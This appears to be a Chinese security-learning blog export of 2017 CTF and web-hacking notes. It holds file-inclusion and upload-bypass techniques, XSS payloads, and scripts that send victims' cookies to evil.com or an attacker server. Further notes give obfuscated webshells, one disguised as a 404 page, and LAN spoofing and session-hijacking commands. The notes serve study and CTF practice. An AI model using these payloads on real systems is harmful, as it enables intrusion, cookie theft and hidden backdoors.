解压密码为4（一开始没看出密码提示winhex打开试了下伪加密 ..后来才知道zip才有伪加密）解压出来只有个0.jpg全黑 文件名为白ste试试没啥用 主要关注点都在 这个0.jpg上 但是这个压缩包直接打开会发现还有一个 Thumbs.db文件这个以前常见的Thumbs.db 常保存图片文件的缩略图 直接解压是看不到的。。下载 图片历史纪录查看器 或者 Thumbs Viewer 查看得到flag binwalk也可以 binwalk “-D=jpeg” Thumbs.db (ls命令是可以看到db文件的)(jpeg要小写)（jpeg是文件格式 需要具体更改 如果是bmp图则改为bitmap）得到 web/misc+crypto再膜一波出题大佬 进入网站一个登陆框 出题人提示不是sql或者xss 弱口令猜测 admin green（就是试 有提示green） 这时左边出现photo is the boss !!!右边代码里多出注释&#39;***&#39;=&#39;3&#39; 并且右边源代码里有 图片地址 goodhat.jpg 可知在同一目录下访问pcat.cc/green/goodhat.jpg 下载图片 直接winhex打开这时知道了提示的作用替换掉 然后decode(‘hex’) 就是其中 “\\n”为换行符用yafu来分解n factor() 然后编写代码 (yafu介绍写在后面)1234567891011121314# -*- coding:utf8 -*-import libnumimport gmpy2n=73069886771625642807435783661014062604264768481735145873508846925735521695159e=65537p = 386123125371923651191219869811293586459q = 189239861511125143212536989589123569301assert n==p*qc=15116717704501623028903918131505510580599561357387431295289012193980554012811d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)print libnum.n2s(m) 需要先安装两个库 gmpy2库安装2.7对应版本时 64位 直接安exe whl文件安装会报错 得到结果为 nc 119.28.15.34 8888 浏览器访问下试了试 去Kail 是一个 pwn 根据提示猜出payload 拿到flag yafuRSA 利用公约数分解 针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。 在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。 此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。 在直接分解n无望，不能利用公约数分解n之后，都应该使用yafu去试一下 密码学的东西不太懂 直接贴网址 http://www.tuicool.com/articles/iYBZBfy 一点其他的pwn记录这个是因为比赛后看到了学长和一个大佬的交流中出现了 print asm(shellcraft.i386.linux.sh())这个东东 查了一下 shellcraft可以生成对应架构的shellcode代码 asm用于汇编和 反汇编源于一个ctf常用库 pwntools http://m.blog.csdn.net/gyhgx/article/details/53439417 顺便了解下 bpython","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"crypto","slug":"crypto","permalink":"http://Merl1ng.com/tags/crypto/"}]},{"title":"文件包含和php伪协议","slug":"文件包含和php伪协议","date":"2017-07-27T10:16:25.000Z","updated":"2017-10-03T09:23:08.345Z","comments":true,"path":"2017/07/27/文件包含和php伪协议/","link":"","permalink":"http://Merl1ng.com/2017/07/27/文件包含和php伪协议/","excerpt":"文件包含本地包含在test.txt内写入&lt;?php phpinfo();?&gt;仅仅调用 phpinfo 来测试 会使页面显示php信息方便观察然后在相同目录下放置一个fileinclude.php","text":"文件包含本地包含在test.txt内写入&lt;?php phpinfo();?&gt;仅仅调用 phpinfo 来测试 会使页面显示php信息方便观察然后在相同目录下放置一个fileinclude.php12345&lt;?php$file=@$_GET['file'];if($file)&#123; echo \"&lt;center&gt;File:\".$file.\"&lt;br/&gt;Result:&lt;/center&gt;\"; include $file; 第一行代码获取URL 参数file 的内容。2 ~4行首先判断$file 是否为空，若不为空，输出其内容，并将其作为文件名称包含将其部署在 localhost下然后访问 http://localhost/fileinclude.php?file=test.txt 会看到phpinfo的输出即test.txt里面的php代码被执行 test文件的扩展名为txt而不是.php也能说明该漏洞无视扩展名 （jpg也同样有效）但是如果被包含的文件里面没有php标签 那么就会当成html内容如实显示出来 远程包含需要 php配置文件中 allow_url_include 设置为 on http://localhost/fileinclude.php?file=http://locahost/text.txt 截断技巧有些程序会给被包含内容加一些后缀 比如如果fileinclude.php是这样123456&lt;?php $file=@$_GET['file']; if($file)&#123; $file .= '.php'; echo \"&lt;center&gt;File:\".$file.\"&lt;br/&gt;Result:&lt;/center&gt;\"; include $file; &#125; 它的后面加了个.php 所以如果传入 file=test.txt 就会变成text.txt.php 从而包含失败如果php版本小于5.3并且 magic_quotes_gpc 已取消 可以使用 %00截断传入file=text.txt%00 PHP伪协议php中支持的伪协议 file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 对于php://filter名称描述resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 实现文件包含在允许远程包含的情况下(allow_url_include 设置为 on) 可以使用php://伪协议比如php://filter/resource=test.txt可以读取相同文件http://localhost/fileinclude.php?file=php://filter/resource=test.txt 进一步的任意文件读取 当要获取的文件里有不可打印的字符 或想获取的代码php://filter/read=convert.base64-encode/resource=test.txthttp://localhost/fileinclude.php?file=php://filter/read=convert.base64-encode/resource=test.txt 其中php://input代表可以访问请求的原始数据，简单来说POST请求的情况下 php://input可以获取到post的数据。比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的 其可以读取原始的HTTP正文内容 如果将file设置为php://input，并且在HTTP正文中传入PHP代码（可用hackbar Post data写入正文）比如&lt;?phpphpinfo();?&gt;即可以执行代码 对exit的绕过某题目有如下代码1234&lt;?php$content = '&lt;?php exit; ?&gt;';$content .= $_POST['txt'];file_put_contents($_POST['filename'], $content); $content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制） 这里的$_POST[&#39;filename&#39;]是可以控制协议的 即可使用 php://filter协议使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除exit 因为base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码 所以，一个正常的base64_decode实际上可以理解为如下两个步骤： 123&lt;?php$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);base64_decode($_GET['txt']); 所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php://filter/write=convert.base64-decode来首先对其解码在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。 “phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码 结果就是&lt;?php exit; ?&gt;没有了 利用Burp 的Repeatertxt=a一句话的base64编码filename=php://filter/write=convert.base64-decode/resource=shell.php 补一张大佬的效果图","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"webshell","slug":"webshell","permalink":"http://Merl1ng.com/tags/webshell/"},{"name":"include","slug":"include","permalink":"http://Merl1ng.com/tags/include/"}]},{"title":"突破文件上传中对文件的限制","slug":"突破文件上传中对文件的限制","date":"2017-07-27T07:16:11.000Z","updated":"2017-10-03T09:11:27.146Z","comments":true,"path":"2017/07/27/突破文件上传中对文件的限制/","link":"","permalink":"http://Merl1ng.com/2017/07/27/突破文件上传中对文件的限制/","excerpt":"之前记录过在文件上传中突破对一句话代码过滤的限制这次从文件的角度突破限制","text":"之前记录过在文件上传中突破对一句话代码过滤的限制这次从文件的角度突破限制 文件类型限制搭建环境a.php 123456789101112131415161718192021&lt;form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"&gt; 点这里上传文件: &lt;input type=\"file\" name=\"userfile\"&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;?php if(!isset($_FILES['userfile'])) exit; echo \"&lt;pre&gt;\"; print_r($_FILES); echo \"&lt;/pre&gt;\";if(@$_FILES['userfile']['type'] != \"image/gif\")&#123; echo \"对不起，我们只允许上传GIF格式的图片!!\"; exit; &#125; $uploaddir='upfile/'; $PreviousFile=$uploaddir.basename(@$_FILES['userfile']['name']);if(move_uploaded_file(@$_FILES['userfile']['tmp_name'], $Previou sFile)) echo \"上传成功！\"; else echo \"上传失败！\"; 它首先验证了文件类型，如果是 gif则放过 不是 则拦截根据multipart编码类型，type这个东西在浏览器生成之后，是可以改的 我们可以通过Burp拦截并修改这个值首先打开 Burp，配置代理，访问a.php之后开启拦截模式并上传一个文件拦截之后，在proxy中找到Content-Type，发现他是application/oct-stream(这里指的是你上传的文件) ，把它改成image/gif 之后放行 文件扩展名限制1234567891011121314151617181920212223242526272829&lt;form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"&gt; 点这里上传文件: &lt;input type=\"file\" name=\"userfile\"&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;?php function extname($s) &#123; $p = strrpos($s, '.'); if($p === false) retturn''; else return substr($s,$p + 1);&#125;if(!isset($_FILES['userfile'])) exit; echo \"&lt;pre&gt;\"; print_r($_FILES); echo \"&lt;/pre&gt;\";if(extname(@$_FILES['userfile']['name'])!= 'gif')&#123; echo \"对不起，我们只允许上传GIF格式的图片!!\"; exit; &#125; $uploaddir='upfile/'; $PreviousFile=$uploaddir.basename(@$_FILES['userfile']['name']);if(move_uploaded_file(@$_FILES['userfile']['tmp_name'], $Previou sFile)) echo \"上传成功！\"; else echo \"上传失败！\"; 之前的文件类型校验变成了后缀名校验 那么如何绕过呢？其实，很多服务器都可以使用 00截断来绕过。原理是这样，操作系统不允许文件中存在空字符’\\0’，所以保存文件时会发生截断，只保留空字符前面的东西作为文件名但是后端程序中是可以处理空字符的。例如，我们如果把文件名改成1.php\\0.jpg ，那么在程序中，它的扩展名为jpg，但是保存之后,文件名为1.php，从而达到绕过的目的 同样使用Burp操作 点击Intercept is on 关闭拦截模式点击Send to Repeater 在 Repeater 中找到在1.php(上传的文件名)后添加.gif然后点击hex.gif的十六进制是2e 67 69 66在2e右键 insert byte2e之前就会出现00 点击go发送请求 Nginx解析漏洞www.qaq.com存在漏洞假设该站点上有一张图片 url地址为www.qaq,com/logo.jpg当正常访问时 Nginx会把它当做非脚本 直接读取并传给客户端但是如果这样访问 www.qaq.com/logo.jpg/a.php或者 www.qaq.com/logo.jpg%00.php它就会把logo.php当做PHP文件执行 所以为了利用该漏洞可以找一张图片 在里面插入一句话（图片用Notepad++打开写入代码）上传该图片然后 以www.qaq.com/123.jpg/a.php为url 连接菜刀 Apache解析漏洞Apache的1.x和2.x版本中 会从右到左解析扩展名 碰到不认识的扩展名继续解析比如上传 123.php.owf.rar 它将按照 rar owf php 的顺序解析扩展名但是其不认识 rar 和 owf 所以将其解析为 php 但是在程序中123文件的扩展名仍是rar","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"webshell","slug":"webshell","permalink":"http://Merl1ng.com/tags/webshell/"}]},{"title":"xss长度限制绕过","slug":"xss长度限制绕过","date":"2017-07-26T09:40:34.000Z","updated":"2017-07-27T06:05:19.598Z","comments":true,"path":"2017/07/26/xss长度限制绕过/","link":"","permalink":"http://Merl1ng.com/2017/07/26/xss长度限制绕过/","excerpt":"实验吧遇到的一道题 input输入框内存在xss 但是限制了输入长度 则可以通过注释符打通两个注释框之间的部分","text":"实验吧遇到的一道题 input输入框内存在xss 但是限制了输入长度 则可以通过注释符打通两个注释框之间的部分比如某网站留言板分别有留言标题 和 留言内容两个输入框 在第一个输入框内输入&lt;script&gt;&lt;!-- 第二个输入框内输入--&gt;alert(/xss/)&lt;script/&gt;成功弹窗 还有一种情况在留言处虽然有多处输入框 但是只有一处存在xss但是此处存在长度限制 比如在第一个输入框内 则可以通过两次连续留言用注释打通 第一次留言时在第一个输入框内写下*/&lt;/script&gt;（先留的言在后面）其他的输入框内容随便写先提交留言 然后进行第二次留言在第一个输入框内写下&lt;script&gt;alert(&#39;xss&#39;)/*其他的输入框内容随便写（当时的题即使用不同的用户进行留言仍然可以弹窗）","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"}]},{"title":"xss所加载的脚本","slug":"xss所加载的脚本","date":"2017-07-24T09:44:20.000Z","updated":"2017-07-28T05:58:48.742Z","comments":true,"path":"2017/07/24/xss所加载的脚本/","link":"","permalink":"http://Merl1ng.com/2017/07/24/xss所加载的脚本/","excerpt":"XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js","text":"XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本jshttp://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码 在evil.js中 可写入123var img = document.createElement(\"img\");img.src = \"http://www.evil.com/log?\"+escape(document.cookie);document.body.appendChild(img); 这段代码在页面中插入了一张看不见的图片 同时把document.cookie对象作为参数发送到远程服务器 http://www.evil.com/log 可以不存在 因为这个请求会在远程服务器的Web日志中留下记录127.0.0.1 - - [24/Jul/2017:20:19:18 +8080] “GET /log?cookie1%D1234 HTTP1.1” 404 288 利用XSS删除文章首先正常删除该文章的连接是http://blog.sohu.com/manage/entry.do?m=delete&amp;id=12345678 则只要知道文章的id 就可以通过这个请求删除改文章 可以通过插入一张图片来发起一个GET请求XSS Payload为123var img = document.createElement(\"img\");img.src = \"http://blog.sohu.com/manage/entry.do?m=delete&amp;id*12345678\";document.body.appendChild(img); 加载目标网站上不是该站的脚本在目标网站上找到不是本站的js 然后渗透那个网站 重写js 来达到渗透目标网站 1234567for(var i=0,tags=document.querySelectorAll('iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'),tag;tag=tags[i];i++)&#123; var a = document.createElement('a'); a.href = tag.src||tag.href||tag.data; if(a.hostname!=location.hostname)&#123; console.warn(location.hostname+' 发现第三方资源['+tag.localName+']:'+a.href); &#125;&#125; （这段代码实际可以找出J/C）将该段代码输入在控制台内 回车比如在www.CUC.com内输入显示发现第三方资源http://www.qaq.pw/1.js 渗透http://www.qaq.pw/1.js在1.js下重写js 即XSS Payload 当然 如果这个js是你自己写的就更加方便 外源JS现在的Web应用或多或少会使用一些外源的 JS，但这里面可能存在安全隐患。如果你自己编写了一个JS文件，提供了一些功能，并且把它放到了CDN上给别人用 你就可以修改它的内容所有使用它的站点都会受到影响 比如，你可以插入一个location.href的赋值来劫持站点，或者插入XSS平台的Payload来获取用户Cookie再或者插入一个对资源的访问来DDoS该站点。这种情况下，你可以让这些站点来帮你执行任何代码","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"}]},{"title":"xss基础笔记","slug":"xss基础笔记","date":"2017-07-23T14:27:34.000Z","updated":"2017-08-08T07:25:56.134Z","comments":true,"path":"2017/07/23/xss基础笔记/","link":"","permalink":"http://Merl1ng.com/2017/07/23/xss基础笔记/","excerpt":"xss就是在页面执行你想要的jsxss原理本地搭建php环境 然后在index.php文件里写入如下代码(index是普遍意义上”首页”)","text":"xss就是在页面执行你想要的jsxss原理本地搭建php环境 然后在index.php文件里写入如下代码(index是普遍意义上”首页”)1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\" method=\"get\"&gt;&lt;input type=\"text\" name=\"xss_input\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php$xss = $_GET['xss_input'];echo '你输入的字符为&lt;br&gt;'.$xss;?&gt;&lt;/body&gt;&lt;/html&gt; 输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;成功弹窗输出点在&lt;br&gt;和&lt;/boby&gt;里 利用xss输出的环境来构造代码(除了上述的在&lt;br&gt;和&lt;/boby&gt;里，还有很多其他情况) 12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;&lt;form action=\"\" method=\"get\"&gt;&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;&lt;input type=\"text\" name=\"xss_input_value\" value=\"输入\"&gt;&lt;br&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php$xss = $_GET['xss_input_value'];if(isset($xss))&#123;echo '&lt;input type=\"text\" value=\"'.$xss.'\"&gt;';&#125;else&#123;echo '&lt;input type=\"type\" value=\"输出\"&gt;';&#125;?&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 这时输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;无弹窗因为输入点在value属性里面，会被当成value里的值来显现出来，所以并没有弹窗因此改为&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;闭合input标签 成功弹窗 但是会多出一个”&gt; 并会直接把多余的字符串输出原因在于使用了标签 so…需要在input标签里不带标签的且可以调用js的属性-&gt;on事件&quot; onclick=&quot;alert(&#39;xss&#39;)onclick-&gt;当鼠标点击的第二个input输入框时触发也可以成功弹窗 进一步 可以把onclick改成Onmousemove 当鼠标移动就触发Onload 当页面加载完成后触发 在&lt;textarea&gt;标签里 或者其他优先级比script高的标签通过闭合完整的标签&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 几种过滤的解决办法（暂时放这）&lt;img scr=1 onerror=alert(&#39;xss&#39;)&gt;当找不到图片名为1的文件时，执行alert(‘xss’)&lt;a href=javascrip:alert(&#39;xss&#39;)&gt;s&lt;/a&gt; 点击s时运行alert(‘xss’)&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe的scr来弹窗&lt;img src=&quot;1&quot; onerror=eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29&quot;)&gt;&lt;/img&gt;过滤了alert来执行弹窗 xss分类反射型XSS、储蓄型XSS、DOM XSS 反射型XSSHacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短——发送给受害人——受害打开后执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等) 比如http://qaq.cn/id=123存在xss漏洞可用JSky、Safe3WVS、Netsparker等软件挖掘出部分反射XSS查看网站源码（view-source:网址 或者 ctrl+u）在id=123后面写abc ctrl+f搜索abc看其出现在哪个位置根据环境构造代码 写在之后 比如http://qaq.cn/id=123&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;把url变成短连接，发送给管理员，诱使管理员打开 储蓄型XSS储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上打开留言处(book.asp)先在留言里出输入s提交留言，F12打开审查元素，来看输入的标签是否被过滤了如果s是彩色的说明没有过滤，如果是灰色就说明过滤了若没过滤 再次留言 可写&quot;&lt;script src=&quot;url&quot;&gt;&lt;/script&gt;请问怎么报名啊&quot;url为你自己的网站无论是谁点击了你所留言的网址（不是你自己那个网址）即可收割cookie Exp 1&lt;script src=&quot;http://qaq.com/joke.js&quot;&gt;&lt;/script&gt;将先加载joke.js的脚本 1234var img = document.createElement('img');img.width = 0;img.height = 0;img.src = 'http://qaqcom/joke/joke.php?joke='+encodeURIComponent(document.cookie); 创建一个img标签，将它的src属性指向.预先写好的一个脚本joke.php 并且将页面的cookie最为参数附加到url后面 joke.php里解析请求里面的joke参数（即用户的cookie）然后保存 12345678910111213&lt;?php @ini_set('display_errors',1); $str = $_GET['joke']; $filePath = \"joke.php\"; if(is_writable($filePath)==false)&#123; echo \"can't write\"; &#125;else&#123; $handler = fopen(filePath, \"a\"); fwrite($handler, $str); fclose($handler); &#125;?&gt; Exp 21234567891011121314151617181920212223&lt;html&gt;&lt;title&gt;xx&lt;/title&gt;&lt;body&gt;&lt;%testfile = Server.MapPath(\"code.txt\") //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中msg = Request(\"msg\") //获取提交过来的msg变量，也就是cookie值set fs = server.CreateObject(\"scripting.filesystemobject\")//创建一个fs对象set thisfile = fs.OpenTextFile(testfile,8,True,0)thisfile.WriteLine(\"\"&amp;msg&amp;\"\")//像code.txt中写入获取来的cookiethisfile.close() //关闭set fs = nothing%&gt;&lt;/body&gt;&lt;/html&gt; 把上述文件保存为cookie.asp文件，放到自己的网站服务器下xss构造为&lt;script&gt;window.open(&#39;http://10.10.10.10/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt; 点击留言页面后进入后页面会跳转，此时cookie就发送到自己的服务器下的code.txt文件中了 DOM Based XSSDOM XSS 从效果上来说也是反射型DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的 file:///C:/Users/Administrator/Desktop/1.html在1.html后面输入&lt;script&gt;document.write(document.URL.substring(document.URL.indexOf(&quot;a=&quot;+2,document.URL.length));&lt;/script&gt; Document.write是把里面的内容写到页面里 document.URL是获取URL地址 Substring 从某处到某处，把之间的内容获取 document.URL.indexOf(“a=”)+2是在当前URL里从开头检索a=字符，然后加2(因为a=是两个字符，我们需要把他略去)，同时他也是substring的开始值 document.URL.length是获取当前URL的长度，同时也是substring的结束值 合起来的意思就是：在URL获取a=后面的值，然后把a=后面的值给显示出来 将显示ile:///C:/Users/Administrator/Desktop/1.html因为当前url并没有a=的字符，而indexOf的特性是，当获取的值里，如果没有找到自己要检索的值的话，返回-1。找到了则返回0。那么document.URL.indexOf(&quot;a=&quot;)则为-1，再加上2，得1。然后一直到URL最后。这样一来，就把file的f字符给略去了，所以才会出现ile:///C:/Users/Administrator/Desktop/1.html（这点还不是很懂） 在a=后面输入123将显示123 输入&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;成功弹窗 dom xss 的脚本代码虽然也在url中 但是与反射型不同的是 代码在 #(hash)后面并且直接查看源码看不到","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"},{"name":"javascript","slug":"javascript","permalink":"http://Merl1ng.com/tags/javascript/"},{"name":"html","slug":"html","permalink":"http://Merl1ng.com/tags/html/"}]},{"title":"bypass_waf","slug":"bypass_waf","date":"2017-07-20T13:44:22.000Z","updated":"2017-07-26T05:08:52.631Z","comments":true,"path":"2017/07/20/bypass_waf/","link":"","permalink":"http://Merl1ng.com/2017/07/20/bypass_waf/","excerpt":"一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来","text":"一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;利用 在hackbar Post data写入xx=assert￥oo=QAQ 姿势二 无Postgetallheaders函数能够获取请求头内容&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;结合姿势一&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt; 姿势三 遇到会检测http请求头内容的waf&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;解开之后发现是乱码，waf识别不出来里面的内容结合姿势一&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt; 姿势四 防止管理员删shell&gt;伪装成404 1234567891011121314151617&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; ... &lt;?php$xx=getallheaders()['xx'];$oo=getallheaders()['oo'];if($xx!=\"\" and $oo!=\"\")&#123; $xx=gzuncompress(base64_decode($xx));$xx(gzuncompress(base64_decode($oo)));&#125;&gt;&lt;/body&gt;&lt;/html&gt; SQL XSS bypass waf姿势一 大小写转换SQL：sEleCt vERsIoN()XSS：&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt; 姿势二 字符编码SQL：load_file(0x633A2F77696E646F77732F6D792E696E69)XSS：&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt; 姿势三 拼凑法 其只验证一次SQL：selselectect verversionsion();XSS：&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt; 姿势四 干扰字符污染法：空字符 空格 TAB换行 注释 特殊的函数等等都可以SQL：sEleCt+1-1+vERsIoN /*!*/ ();","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"waf","slug":"waf","permalink":"http://Merl1ng.com/tags/waf/"},{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"},{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"}]},{"title":"一句话木马和中国菜刀","slug":"一句话木马和中国菜刀","date":"2017-07-18T14:11:31.000Z","updated":"2017-08-10T15:43:49.518Z","comments":true,"path":"2017/07/18/一句话木马和中国菜刀/","link":"","permalink":"http://Merl1ng.com/2017/07/18/一句话木马和中国菜刀/","excerpt":"看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下","text":"看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下&lt;?php @eval($_POST[&#39;QAQ&#39;]);?&gt; (@符号的意思是不报错)顺便asp为&lt;%eval request(&quot;QAQ&quot;)%&gt; “QAQ”相当于一个标记。eval是一个php函数他将符合php语法的字符当做php代码进行执行即一个后门 （怎么用hackbar的Post data写入文件还不会…以后回来改） 连接菜刀 输入网站 和当时标记即可拿shell查看文件（flag）等等","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"webshell","slug":"webshell","permalink":"http://Merl1ng.com/tags/webshell/"}]},{"title":"lan attack","slug":"lan attack","date":"2017-05-30T15:13:26.000Z","updated":"2017-07-25T06:13:17.443Z","comments":true,"path":"2017/05/30/lan attack/","link":"","permalink":"http://Merl1ng.com/2017/05/30/lan attack/","excerpt":"内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig","text":"内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig arp 欺骗先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward再arpspoof … driffnet 获取本机网卡图片driffnet -i 网卡会弹一个小窗口可在/tmp内找到图片 httpettercap dns欺骗 流量嗅探先arp欺骗 再 ettercap-Tq-i eth0(Tq 启动文本模式 q安静模式) httpssslstrip 将https链接还原为http （缺点：证书错误）首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出vim/etc/ettercap/etter.conf光标移动到 linux 删除下两个# 设置完成sslstrip -a -f -k 会话劫持way1 先arp欺骗wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量输入wireshark 为图形界面抓包并保存为QAQ.pacp文件再ferret -r QAQ.pacp生成txt文件 将该文件复制到cp hamster.txt /root/输入 hamster 根据提示修改浏览器代理设置进入网址 way2ferret -i eth0(网卡)浏览器设置同上再hamster （若有hamster文件存在需先删除）进入网址同步获取 way3cookie 